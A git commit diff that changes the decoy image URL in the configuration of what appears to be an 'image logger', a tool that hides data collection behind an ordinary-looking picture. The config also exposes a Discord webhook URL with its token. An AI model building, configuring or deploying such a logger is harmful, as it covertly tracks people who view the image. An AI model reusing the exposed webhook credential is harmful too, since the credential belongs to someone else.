bfccf4ec065940e1eaa8547b3af87f70abaa6a9f
piloverbg <reubenc2020@googlemail.com>
2026-08-27 20:56:25 +0100

    Update image URL in configuration

--- api/image.py
+++ api/image.py
@@ -15,7 +15,7 @@ __author__ = "fishyramen"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1542608052543422566/yvdEUw5bLpt1BuUd-mOqY8Houe57PgVoRwDi44flVbuxSrDkv6GSHI8y6SxKPQZ4ztnf",
-    "image": "https://pbs.twimg.com/media/HFd23_uXIAA2X24.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTQ2TyaqYPqH52EExg5ioVJO8zRsIZ0IxWKsIjE9TyvvA&s=10", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
